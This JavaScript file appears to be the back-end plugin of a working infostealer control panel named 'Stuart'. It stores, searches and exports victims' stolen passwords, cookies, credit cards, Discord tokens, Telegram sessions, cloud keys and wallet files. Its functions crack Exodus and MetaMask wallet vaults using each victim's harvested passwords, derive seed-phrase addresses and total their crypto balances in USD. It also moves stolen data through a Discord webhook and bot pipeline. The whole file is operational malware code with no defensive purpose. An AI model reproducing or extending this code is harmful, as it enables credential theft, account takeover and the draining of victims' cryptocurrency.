      await Promise.all(tokens.map(t => enrichDiscordToken(ctx, t.client_id, t.token).catch(() => {})));
      ctx.broadcast("harvest_update", { clientId: cid || null });
      return { ok: true, enriched: tokens.length };
    },
    list_files(ctx, params)          { return listTable(ctx, TABLE_CFGS.files,          params); },
    list_extensions(ctx, params)     { return listTable(ctx, TABLE_CFGS.extensions,     params); },
    list_wallets(ctx, params)        { return listTable(ctx, TABLE_CFGS.wallets,        params); },
    list_telegram(ctx, params)       { return listTable(ctx, TABLE_CFGS.telegram,       params); },
    list_keys(ctx, params)           { return listTable(ctx, TABLE_CFGS.keys,           params); },
    list_seeds(ctx, params)              { return listTable(ctx, TABLE_CFGS.seeds,              params); },

    get_wallet_seeds(ctx, params) {
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");
      const rows = ctx.db.prepare(`SELECT source, phrase, addresses FROM seeds WHERE client_id = ? AND source LIKE 'wallet:%' AND valid = 1`).all(cid);
      const result = {};
      for (const r of rows) {
        const walletName = r.source.replace(/^wallet:/, '');
        result[walletName] = { mnemonic: r.phrase, addresses: JSON.parse(r.addresses || '[]') };
      }
      return result;
    },
    list_app_credentials(ctx, params)   { return listTable(ctx, TABLE_CFGS.app_credentials,   params); },
    list_gaming_items(ctx, params)      { return listTable(ctx, TABLE_CFGS.gaming_items,      params); },
    list_vpn_items(ctx, params)         { return listTable(ctx, TABLE_CFGS.vpn_items,         params); },

    export_client(ctx, params) {
      const cid = params?.clientId;
      const p = { clientId: cid, limit: 0 };
      const result = {};
      for (const [key, cfg] of Object.entries(TABLE_CFGS))
        result[key] = listTable(ctx, cfg, p).rows;
      if (cid) {
        const profiles = ctx.db.prepare(`
          SELECT dt.client_id as clientId, dt.token, dt.source,
                 dp.user_id, dp.username, dp.discriminator, dp.global_name,
                 dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
                 dp.friends_count, dp.guilds_count, dp.guild_names, dp.error
          FROM discord_tokens dt
          LEFT JOIN discord_profiles dp ON dp.token = dt.token
          WHERE dt.client_id = ?
          ORDER BY dt.captured_at DESC
        `).all(cid);
        result.discord_profiles = profiles;
      }
      return result;
    },

    global_search(ctx, params) {
      const search = String(params?.search || '').trim();
      if (!search) return { groups: [] };
      const cid = params?.clientId;
      const perGroup = Math.max(1, Math.min(50, Number(params?.limit ?? 10)));
      const pattern = `%${search}%`;

      const SEARCH_TABLES = [
        { key: 'passwords',     label: 'Passwords',      cfg: TABLE_CFGS.passwords },
        { key: 'cookies',       label: 'Cookies',        cfg: TABLE_CFGS.cookies },
        { key: 'autofill',      label: 'Autofill',       cfg: TABLE_CFGS.autofill },
        { key: 'history',       label: 'History',        cfg: TABLE_CFGS.history },
        { key: 'bookmarks',     label: 'Bookmarks',      cfg: TABLE_CFGS.bookmarks },
        { key: 'creditCards',   label: 'Credit Cards',   cfg: TABLE_CFGS.credit_cards },
        { key: 'discordTokens', label: 'Discord Tokens', cfg: TABLE_CFGS.discord_tokens },
        { key: 'files',         label: 'Files',          cfg: TABLE_CFGS.files },
        { key: 'extensions',    label: 'Extensions',     cfg: TABLE_CFGS.extensions },
        { key: 'wallets',       label: 'Wallets',        cfg: TABLE_CFGS.wallets },
        { key: 'keys',          label: 'Keys',           cfg: TABLE_CFGS.keys },
        { key: 'seeds',           label: 'Seeds',            cfg: TABLE_CFGS.seeds },
        { key: 'appCredentials', label: 'App Credentials', cfg: TABLE_CFGS.app_credentials },
      ];

      const groups = [];
      for (const { key, label, cfg } of SEARCH_TABLES) {
        if (!cfg.searchOn.length) continue;
        const wheres = [], args = [];
        if (cid) { wheres.push('client_id = ?'); args.push(cid); }
        wheres.push('(' + cfg.searchOn.map(c => `${c} LIKE ?`).join(' OR ') + ')');
        for (let i = 0; i < cfg.searchOn.length; i++) args.push(pattern);
        const where = ' WHERE ' + wheres.join(' AND ');
        const total = ctx.db.prepare(`SELECT COUNT(*) as n FROM ${cfg.tbl}${where}`).get(...args).n;
        if (total === 0) continue;
        const rows = ctx.db.prepare(`SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order} LIMIT ${perGroup}`).all(...args);
        groups.push({ key, label, total, rows });
      }
      return { groups };
    },

    download_telegram(ctx, params) {
      const id = params?.id;
      if (!id) throw new Error("id required");
      const result = readTelegramContentById(ctx.db, id);
      if (!result) throw new Error("No data found");
      return { name: result.account + "_tdata.zip", content: result.content.toString('base64') };
    },

    list_wallet_data(ctx, params) {
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");
      const rows = ctx.db.prepare(`SELECT id, client_id AS clientId, name, path, type, addresses, vault_data IS NOT NULL AS hasVault, (content IS NOT NULL OR blob_path IS NOT NULL) AS hasContent, size, captured_at FROM wallet_data WHERE client_id = ? ORDER BY captured_at DESC`).all(cid);
      for (const r of rows) r.addresses = JSON.parse(r.addresses || '[]');
      return { rows, total: rows.length };
    },

    download_wallet_data(ctx, params) {
      const id = params?.id;
      if (!id) throw new Error("id required");
      const result = readWalletContentById(ctx.db, id);
      if (!result) throw new Error("No data found");
      return { name: result.name, content: result.content.toString('base64') };
    },

    async check_balances(ctx, params) {
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");

      const wallets = ctx.db.prepare(`SELECT name, addresses FROM wallet_data WHERE client_id = ? AND addresses IS NOT NULL AND addresses != '[]'`).all(cid);
      const allAddrs = [];
      for (const w of wallets) {
        for (const addr of JSON.parse(w.addresses || '[]'))
          allAddrs.push({ wallet: w.name, address: addr });
      }
      if (!allAddrs.length) return { results: [], message: "No addresses found" };

      const unique = [...new Set(allAddrs.map(a => a.address.toLowerCase()))];
      const balanceMap = {};

      await Promise.all(BALANCE_CHAINS.map(async (chain) => {
        try {
          const res = await fetchWithTimeout(chain.rpc, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(unique.map((addr, i) => ({
              jsonrpc: "2.0", method: "eth_getBalance", params: [addr, "latest"], id: i,
            }))),
          });
          const data = await res.json();
          for (const r of Array.isArray(data) ? data : [data]) {
            if (!r.result) continue;
            const addr = unique[r.id];
            const wei = BigInt(r.result);
            if (wei === 0n) continue;
            if (!balanceMap[addr]) balanceMap[addr] = {};
            balanceMap[addr][chain.name] = Number(wei) / 1e18;
          }
        } catch (_) {}
      }));

      const results = allAddrs.map(a => ({
        wallet: a.wallet,
        address: a.address,
        balances: balanceMap[a.address.toLowerCase()] || {},
      }));
      return { results };
    },

    async crack_exodus(ctx, params) {
      const cid = params?.clientId;
      const walletName = params?.walletName || "Exodus";
      if (!cid) throw new Error("clientId required");

      const content = readWalletContent(ctx.db, cid, walletName);
      if (!content) return { cracked: false, tried: 0, skipped: true, reason: "No wallet content found" };

      const passwords = ctx.db.prepare(`SELECT DISTINCT password FROM passwords WHERE client_id = ? AND password IS NOT NULL AND password != ''`).all(cid).map(r => r.password);
      if (!passwords.length) return { cracked: false, tried: 0, skipped: true, reason: "No passwords available" };

      function extractFromZip(buf, targetSuffix) {
        function findEOCD(b) { for (let i = b.length - 22; i >= Math.max(0, b.length - 65557); i--) if (b.readUInt32LE(i) === 0x06054b50) return i; return -1; }
        const eocd = findEOCD(buf);
        if (eocd < 0) return null;
        const cdOff = buf.readUInt32LE(eocd + 16);
        const cdCount = buf.readUInt16LE(eocd + 10);
        let off = cdOff;
        for (let i = 0; i < cdCount; i++) {
          if (buf.readUInt32LE(off) !== 0x02014b50) break;
          const compMethod = buf.readUInt16LE(off + 10);
          const compSize = buf.readUInt32LE(off + 20);
          const fnameLen = buf.readUInt16LE(off + 28);
          const extraLen = buf.readUInt16LE(off + 30);
          const commentLen = buf.readUInt16LE(off + 32);
          const localOffset = buf.readUInt32LE(off + 42);
          const fname = buf.slice(off + 46, off + 46 + fnameLen).toString('utf8');
          if (fname.endsWith(targetSuffix)) {
            const lfn = buf.readUInt16LE(localOffset + 26);
            const lex = buf.readUInt16LE(localOffset + 28);
            const dataStart = localOffset + 30 + lfn + lex;
            const comp = buf.slice(dataStart, dataStart + compSize);
            if (compMethod === 0) return comp;
            if (compMethod === 8) return inflateRawSync(comp);
          }
          off += 46 + fnameLen + extraLen + commentLen;
        }
        return null;
      }

      function getSecoBuffer(buf, filename) {
        if (buf.readUInt32LE(0) === 0x04034b50) return extractFromZip(buf, filename);
        if (buf.slice(0, 4).toString('ascii') === 'SECO') return buf;
        return null;
      }

      const SUPPORTED_WALLETS = ['Exodus'];
      const supported = SUPPORTED_WALLETS.includes(walletName);
      const warning = supported ? null : `"${walletName}" is not a verified wallet. Only the following wallets have been tested: ${SUPPORTED_WALLETS.join(', ')}. Results may be inaccurate — verify manually.`;

      const seedBuf = getSecoBuffer(content, 'seed.seco');
      if (!seedBuf) return { cracked: false, tried: 0, skipped: true, reason: "No seed.seco found — wallet format not supported for this method" };

      for (const password of passwords) {
        try {
          const result = secoDecrypt(seedBuf, password);
          const dataLen = result.data.readUInt32BE(0);
          const shrinked = result.data.slice(4, dataLen + 4);
          const gunzipped = gunzipSync(shrinked);
          const mnemonic = seedFromBuffer(gunzipped).mnemonicString;
          const addresses = [
            ...deriveEthAddresses(mnemonic, 2).map(a => ({ chain: "EVM", address: a })),
            ...deriveBtcAddresses(mnemonic, 1).map(a => ({ chain: "BTC", address: a })),
            ...deriveLtcAddresses(mnemonic, 1).map(a => ({ chain: "LTC", address: a })),
            ...deriveTrxAddresses(mnemonic, 1).map(a => ({ chain: "TRX", address: a })),
          ];
          const words = mnemonic.split(/\s+/);
          stmts.insSeed.run(cid, `wallet:${walletName}`, null, mnemonic, words.length, 1, JSON.stringify(addresses), Date.now());
          return { cracked: true, password, mnemonic, addresses, warning };
        } catch (_) {
          continue;
        }
      }
      return { cracked: false, tried: passwords.length, warning };
    },

    async check_cracked_balances(ctx, params) {
      const mnemonic = params?.mnemonic;
      if (!mnemonic) throw new Error("mnemonic required");

      const ethAddrs = deriveEthAddresses(mnemonic, 3);
      const btcAddrs = deriveBtcAddresses(mnemonic, 2);
      const ltcAddrs = deriveLtcAddresses(mnemonic, 2);
      const trxAddrs = deriveTrxAddresses(mnemonic, 2);

      const [evmNative, erc20, btcBals, ltcBals, trxBals] = await Promise.all([
        checkEvmNativeBalances(ethAddrs),
        checkErc20Balances(ethAddrs),
        checkBtcBalances(btcAddrs),
        checkLtcBalances(ltcAddrs),
        checkTrxBalances(trxAddrs),
      ]);

      const totals = {};
      function merge(balMap) {
        for (const addr of Object.keys(balMap)) {
          for (const [chain, val] of Object.entries(balMap[addr])) {
            totals[chain] = (totals[chain] || 0) + val;
          }
        }
      }
      merge(evmNative);
      merge(erc20);
      merge(btcBals);
      merge(ltcBals);
      merge(trxBals);

      // Fetch USD prices
      let usdTotal = 0;
      const usdByAsset = {};
      try {
        const ids = "bitcoin,ethereum,tron,litecoin,binancecoin,matic-network,avalanche-2";
        const priceRes = await fetchWithTimeout(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
        const prices = await priceRes.json();
        const priceMap = {
          BTC: prices.bitcoin?.usd || 0,
          LTC: prices.litecoin?.usd || 0,
          ETH: prices.ethereum?.usd || 0,
          BSC: prices.binancecoin?.usd || 0,
          Polygon: prices["matic-network"]?.usd || 0,
          Arbitrum: prices.ethereum?.usd || 0,
          Optimism: prices.ethereum?.usd || 0,
          Base: prices.ethereum?.usd || 0,
          Avalanche: prices["avalanche-2"]?.usd || 0,
          TRX: prices.tron?.usd || 0,
        };
        for (const [asset, amount] of Object.entries(totals)) {
          // Stablecoins
          if (asset.includes("USDT") || asset.includes("USDC") || asset.includes("DAI")) {
            const usd = amount;
            usdByAsset[asset] = usd;
            usdTotal += usd;
          } else {
            const price = priceMap[asset] || 0;
            const usd = amount * price;
            if (usd > 0) {
              usdByAsset[asset] = usd;
              usdTotal += usd;
            }
          }
        }
      } catch (_) {}

      const allAddresses = [
        ...ethAddrs.map(a => ({ chain: "EVM", address: a })),
        ...btcAddrs.map(a => ({ chain: "BTC", address: a })),
        ...ltcAddrs.map(a => ({ chain: "LTC", address: a })),
        ...trxAddrs.map(a => ({ chain: "TRX", address: a })),
      ];

      return { addresses: allAddresses, totals, usdTotal: Math.round(usdTotal * 100) / 100, usdByAsset };
    },

    async crack_vault(ctx, params) {
      const cid = params?.clientId;
      const walletName = params?.walletName;
      if (!cid) throw new Error("clientId required");
      if (!walletName) throw new Error("walletName required");

      const SUPPORTED_VAULTS = ['MetaMask'];
      const supported = SUPPORTED_VAULTS.some(s => walletName.toLowerCase().includes(s.toLowerCase()));
      const warning = supported ? null : `"${walletName}" is not a verified vault wallet. Only the following have been tested: ${SUPPORTED_VAULTS.join(', ')}. Results may be inaccurate — verify manually.`;

      const wallet = ctx.db.prepare(`SELECT vault_data FROM wallet_data WHERE client_id = ? AND name = ? AND vault_data IS NOT NULL`).get(cid, walletName);
      if (!wallet?.vault_data) return { cracked: false, tried: 0, skipped: true, reason: "No vault data found for this wallet" };

      const passwords = ctx.db.prepare(`SELECT DISTINCT password FROM passwords WHERE client_id = ? AND password IS NOT NULL AND password != ''`).all(cid).map(r => r.password);
      if (!passwords.length) return { cracked: false, tried: 0, skipped: true, reason: "No passwords available" };

      const vault = JSON.parse(wallet.vault_data);
      const dataBytes = Uint8Array.from(atob(vault.data), c => c.charCodeAt(0));
      const iv = Uint8Array.from(atob(vault.iv), c => c.charCodeAt(0));
      const salt = Uint8Array.from(atob(vault.salt), c => c.charCodeAt(0));

      const enc = new TextEncoder();
      for (const password of passwords) {
        try {
          const keyMaterial = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveKey']);
          const key = await crypto.subtle.deriveKey(
            { name: 'PBKDF2', salt, iterations: 600000, hash: 'SHA-256' },
            keyMaterial,
            { name: 'AES-GCM', length: 256 },
            false, ['decrypt'],
          );
          const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, dataBytes);
          const decoded = new TextDecoder().decode(decrypted);
          const result = JSON.parse(decoded);
          const accounts = extractVaultAccounts(result);
          const mnemonic = accounts.find(a => a.mnemonic)?.mnemonic || null;
          if (mnemonic) {
            const words = mnemonic.split(/\s+/);
            const addresses = [
              ...deriveEthAddresses(mnemonic, 2).map(a => ({ chain: "EVM", address: a })),
              ...deriveBtcAddresses(mnemonic, 1).map(a => ({ chain: "BTC", address: a })),
              ...deriveLtcAddresses(mnemonic, 1).map(a => ({ chain: "LTC", address: a })),
              ...deriveTrxAddresses(mnemonic, 1).map(a => ({ chain: "TRX", address: a })),
            ];
            stmts.insSeed.run(cid, `wallet:${walletName}`, null, mnemonic, words.length, 1, JSON.stringify(addresses), Date.now());
          }
          return { cracked: true, password, mnemonic, accounts, warning };
        } catch (_) {
          continue;
        }
      }
      return { cracked: false, tried: passwords.length, warning };
    },

    async check_seed_balances(ctx, params) {
      const id = params?.id;
      if (!id) throw new Error("id required");
      const row = ctx.db.prepare(`SELECT phrase, valid FROM seeds WHERE id = ?`).get(id);
      if (!row) throw new Error("Seed not found");
      if (!row.valid) throw new Error("Seed phrase is not a valid BIP39 mnemonic");
      return this.check_cracked_balances(ctx, { mnemonic: row.phrase });
    },

    get_capture_settings(ctx, _params, extras) {
      const caller = extras?.caller;
      return publicDiscordSettings(caller?.role === "admin");
    },

    update_capture_settings(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const upsert = ctx.db.prepare(`INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)`);
      if (params.capture_history !== undefined) upsert.run('capture_history', params.capture_history ? '1' : '0');
      if (params.capture_cookies !== undefined) upsert.run('capture_cookies', params.capture_cookies ? '1' : '0');
      if (params.history_limit !== undefined) upsert.run('history_limit', String(Math.max(0, Number(params.history_limit) || 0)));
      if (params.cookie_max_age_days !== undefined) upsert.run('cookie_max_age_days', String(Math.max(0, Number(params.cookie_max_age_days) || 0)));
      if (params.discord_webhook_url !== undefined) {
        const url = String(params.discord_webhook_url || "").trim();
        if (url && !isValidDiscordWebhook(url)) throw new Error("Invalid Discord webhook URL");
        upsert.run('discord_webhook_url', url);
      }
      if (params.discord_upload_enabled !== undefined) upsert.run('discord_upload_enabled', params.discord_upload_enabled ? '1' : '0');
      if (params.discord_bot_token !== undefined) {
        const tok = String(params.discord_bot_token || "").trim();
        // Ignore masked placeholders so Save doesn't wipe the real token
        if (!tok.includes("…") && !tok.includes("****")) upsert.run('discord_bot_token', tok);
      }
      if (params.discord_forum_channel_id !== undefined) {
        upsert.run('discord_forum_channel_id', String(params.discord_forum_channel_id || "").replace(/\D/g, ""));
      }
      if (params.discord_thread_prefix !== undefined) {
        upsert.run('discord_thread_prefix', String(params.discord_thread_prefix || "Stuart").slice(0, 80));
      }
      loadSettings(ctx.db);
      pluginCtx = ctx;
      return { ok: true, settings: publicDiscordSettings(true) };
    },

    /** Force-flush buffered harvest for a client to Discord (pipeline on). Admin only. */
    async upload_to_discord(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      pluginCtx = ctx;
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required for Discord-only pipeline flush");
      return flushDiscordHarvest(cid);
    },

    /** Manual recovery: scan forum for zips not yet imported. Not used on the agent upload path. */
    async poll_discord(ctx, _params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      pluginCtx = ctx;
      return pollDiscordOnce();
    },

    get_discord_poll_status() {
      return { ...discordPollStatus, pipeline: isDiscordPipelineOn(), pollReady: isDiscordPollConfigured() };
    },

    /** Validate webhook (posts a tiny test zip to the forum). Admin only. */
    async test_discord_webhook(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const url = (params?.url !== undefined ? String(params.url || "").trim() : pluginSettings.discord_webhook_url);
      if (!isValidDiscordWebhook(url)) throw new Error("Invalid Discord webhook URL");

      const threadName = forumThreadName("test");
      const content = [
        "**Stuart webhook test**",
        `Time: ${new Date().toISOString()}`,
        `Forum thread: \`${threadName}\``,
        "If pipeline is on, enable bot token + channel id so the server can poll this zip back.",
      ].join("\n");

      const zip = createZipBuffer([
        {
          name: "stuart-test/meta.json",
          data: Buffer.from(JSON.stringify({ v: 1, source: "stuart", clientId: "test", capturedAt: Date.now() }), "utf8"),
        },
        {
          name: "stuart-test/passwords.json",
          data: Buffer.from(JSON.stringify([{ clientId: "test", url: "https://example.com", username: "test", password: "test", browser: "test", profile: "Default" }], null, 2), "utf8"),
        },
      ]);
      try {
        const msg = await postZipToDiscordWebhook({
          webhookUrl: url,
          zip,
          filename: `stuart-test-${Date.now()}.zip`,
          content,
          threadName,
        });
        let imported = null;
        if (pluginCtx?.db && stmts) {
          try {
            imported = await importThisWebhookZip(pluginCtx.db, msg, "test");
          } catch (e) {
            imported = { ok: false, error: e.message };
          }
        }
        return { ok: true, threadName, messageId: msg?.id || null, imported };
      } catch (err) {
        throw new Error(err.message || "Webhook test failed");
      }
    },

    /** Validate bot can see the forum channel. Admin only. */
    async test_discord_bot(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const token = (params?.token !== undefined ? String(params.token || "").trim() : pluginSettings.discord_bot_token);
      const channelId = (params?.channelId !== undefined
        ? String(params.channelId || "").replace(/\D/g, "")
        : pluginSettings.discord_forum_channel_id);
      if (!token || token.includes("…")) throw new Error("Bot token required");
      if (!channelId) throw new Error("Forum channel id required");
      const prevTok = pluginSettings.discord_bot_token;
      pluginSettings.discord_bot_token = token;
      try {
        const me = await discordBotFetch("/users/@me");
        const ch = await discordBotFetch(`/channels/${channelId}`);
        return {
          ok: true,
          bot: { id: me.id, username: me.username },
          channel: { id: ch.id, name: ch.name, type: ch.type, guild_id: ch.guild_id },
        };
      } finally {
        pluginSettings.discord_bot_token = prevTok;
      }
    },

    purge_history(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const cid = params?.clientId;
      let r;
      if (cid) r = ctx.db.prepare(`DELETE FROM history WHERE client_id = ?`).run(cid);
      else r = ctx.db.exec(`DELETE FROM history`);
      const changes = r?.changes ?? 0;
      try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
      return { ok: true, deleted: changes };
    },

    purge_cookies(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const cid = params?.clientId;
      let r;
      if (cid) r = ctx.db.prepare(`DELETE FROM cookies WHERE client_id = ?`).run(cid);
      else r = ctx.db.exec(`DELETE FROM cookies`);
      const changes = r?.changes ?? 0;
      try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
      return { ok: true, deleted: changes };
    },

    delete_client(ctx, params, { caller }) {
      if (!["admin", "user"].includes(caller.role)) throw new Error("Insufficient permissions");
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");
      clearClient(ctx.db, cid);
      ctx.db.prepare(`DELETE FROM client_runs WHERE client_id=?`).run(cid);
      ctx.broadcast("client_deleted", { clientId: cid });
      return { ok: true };
    },

    delete_all(ctx, _params, { caller }) {
      if (caller.role !== "admin") throw new Error("Admin only");
      deleteAllBlobs();
      for (const tbl of ["passwords","cookies","autofill","history","bookmarks","credit_cards","discord_tokens","discord_profiles","files","extensions","wallets","wallet_data","telegram_sessions","cloud_keys","seeds","app_credentials","gaming_items","vpn_items","client_runs"])
        ctx.db.exec(`DELETE FROM ${tbl}`);
      try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
      ctx.broadcast("cleared", { by: caller.id });
      return { ok: true };
    },
  },
};
